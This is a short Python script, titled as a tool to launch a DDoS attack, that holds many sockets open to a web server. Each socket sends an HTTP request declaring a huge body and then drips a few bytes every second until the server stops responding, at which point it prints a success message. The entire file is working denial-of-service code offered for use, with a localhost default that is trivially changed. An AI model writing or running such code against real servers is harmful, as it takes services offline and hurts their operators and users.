# Script to launch a DDOS Attack

import socket
import threading
from time import sleep

MAX_CONNECTIONS = 64  # Max number of connections
HOST_IP = "127.0.0.1"  # IP Address of Host
PORT = 8080  # Port number of host
ROUTE = "/welcome"

# HTTP GET Request Header
buf = (f"GET {ROUTE} HTTP/1.1\r\n"
       f"Host: {HOST_IP}\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
       "\r\n")

# List of socket connections connected successfully
socketConnections = []


def conn_thread():
    # Create sockets and connect them to target
    global socketConnections

    for counter in range(0, MAX_CONNECTIONS):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST_IP, PORT))
            s.send(bytes(buf, encoding='utf-8'))
            print(f"[+++] Socket No. {counter+1} connected to target")
            socketConnections.append(s)
        except Exception as ex:
            print(f"[---] Failed to create socket connection! Error:{ex}")
        sleep(1)


def send_thread():
    # Send infinite number of requests to target till DOS received
    global socketConnections

    # Launching the Attack
    while True:
        didAttackSucceeded = False
        for s in socketConnections:
            try:
                # DDOS Attack
                s.send(bytes("ddos", encoding='utf-8'))
                print("[+++] Request served by Server")
            except Exception as ex:
                print(f"[---] Server failed to serve the Request. Error: {ex}")
                didAttackSucceeded = True
                break
            sleep(1)
        if didAttackSucceeded:
            print(f'DOS ATTACK SUCCEEDED on {HOST_IP}:{PORT} !!!')
            break


def releaseAllSockets():
    # Closes all the socket connections
    for socket in socketConnections:
        socket.close()
    socketConnections.clear()


# Execute Connect and Send tasks using multiple threads
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())

# Starting Attack!!!
conn_th.start()
send_th.start()
conn_th.join()
send_th.join()
releaseAllSockets()
